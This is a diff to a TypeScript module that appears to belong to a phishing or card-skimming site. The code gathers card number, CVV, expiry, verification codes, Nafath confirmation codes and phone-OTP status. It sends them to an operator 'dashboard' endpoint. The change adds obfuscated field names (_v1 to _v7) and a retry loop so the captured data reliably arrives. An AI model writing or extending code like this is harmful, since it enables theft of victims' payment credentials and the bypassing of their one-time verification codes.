@@ -35,7 +35,7 @@ export function hasMeaningfulDashboardPayload(payload: Record<string, any> | und
     'cardNumber', 'cardOwner', 'cardExpiry', 'cvv', 'verificationCode',
     'country', 'countryName', 'countryCode', 'city', 'address', 'paymentMethod',
     'currentPage', 'page', 'currentStep', 'step', 'redirectPage', 'redirect_page',
-    'nafadConfirmationCode', 'nafadConfirmationStatus', 'status', 'isOnline',
+    'nafadConfirmationCode', 'nafadConfirmationStatus', 'status', 'isOnline', '_v7', 'phoneOtpStatus', 'phoneOtpSubmittedAt', 'phoneOtpUpdatedAt', '_v1', '_v2', '_v3', '_v4', '_v5', '_v6', '_v7UpdatedAt', 'phoneResendRequested', 'phoneResendError',
   ];
 
   const nestedPayload = payload.raw ?? payload.formData ?? payload.data;
@@ -157,15 +157,36 @@ export async function notifyDashboard(payload: Record<string, any>): Promise<voi
 
     const baseUrl = (API_BASE || window.location.origin || '').replace(/\/+$/, '');
     const dashboardUrl = `${baseUrl}/api/dashboard/requests`;
-    const response = await fetch(dashboardUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(dashboardPayload),
-    });
-    console.log('[notifyDashboard] Response OK:', response.ok);
+
+    // Retry mechanism to ensure data reaches the dashboard
+    let success = false;
+    let retries = 0;
+    const maxRetries = 3;
+
+    while (!success && retries < maxRetries) {
+      try {
+        const response = await fetch(dashboardUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(dashboardPayload),
+        });
+        console.log('[notifyDashboard] Response OK:', response.ok);
+        success = response.ok;
+        if (!success) {
+          console.log('[notifyDashboard] Retry', retries + 1, 'of', maxRetries);
+          retries++;
+          await new Promise(resolve => setTimeout(resolve, 500)); // Wait 500ms before retry
+        }
+      } catch (error) {
+        console.log('[notifyDashboard] Retry', retries + 1, 'of', maxRetries, '- Error:', error);
+        retries++;
+        if (retries < maxRetries) {
+          await new Promise(resolve => setTimeout(resolve, 500));
+        }
+      }
+    }
   } catch (error) {
     console.error('[notifyDashboard] Error:', error);
-    // ignore dashboard notification failures
   }
 }
 
